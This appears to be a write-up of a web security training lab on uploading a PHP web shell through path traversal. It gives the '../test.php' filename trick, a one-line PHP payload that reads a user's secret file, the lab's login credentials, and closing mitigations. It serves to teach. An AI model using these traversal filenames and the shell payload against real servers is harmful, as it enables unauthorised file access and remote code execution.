# Lab: Web Shell Upload via Path Traversal

## Objective:
Exploit a path traversal vulnerability in the file upload functionality to store a PHP web shell outside the protected upload directory, retrieve Carlos's secret, and solve the lab.

--- 

## Steps:

1. I logged into my account using the provided credentials:

Username: wiener
Password: peter

2. I uploaded a normal avatar image and intercepted the upload request using Burp Suite.

3. I modified the uploaded filename from:

test.php

to

../test.php

(I also tested the URL-encoded version: ..%2ftest.php.)

4. I replaced the image contents with the following PHP payload:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
5. I sent the modified request.

6. The server responded with HTTP 200 OK, indicating that the upload was accepted and the filename containing "../" was not properly sanitized.

7. From the successful response, I inferred that the uploaded file had been stored one directory above the avatars folder.

8. Instead of requesting:

/files/avatars/test.php

I directly requested:

GET /files/test.php

9. The PHP file executed successfully and returned the contents of:

/home/carlos/secret

The returned secret was:

tx8RftxUrLZlVp0rcZBg3GOnU3IZkQQF

10. I copied the secret and submitted it.

The lab was successfully solved.

--- 

## Vulnerability:
Web Shell Upload via Path Traversal

## Cause:
The application failed to properly sanitize the uploaded filename. By supplying "../" in the filename, it was possible to perform path traversal during the file upload process and store the file outside the protected upload directory.

The application prevented PHP execution inside:

/files/avatars/

However, by escaping this directory, the uploaded PHP file was stored inside:

/files/

where PHP execution was allowed.

## Takeaway:
When testing file upload functionality, always check whether the filename is properly sanitized.

If path traversal sequences such as:

- ../
- ..\
- URL-encoded traversal (%2f, %5c)

are accepted, an attacker may escape the intended upload directory and place files inside executable locations.

## Applications should:

- Remove directory traversal sequences from filenames.
- Normalize file paths before saving.
- Store uploaded files outside the web root whenever possible.
- Disable script execution inside upload directories.
- Validate filenames using a strict whitelist.

Failing to sanitize upload paths can lead to Remote Code Execution (RCE).
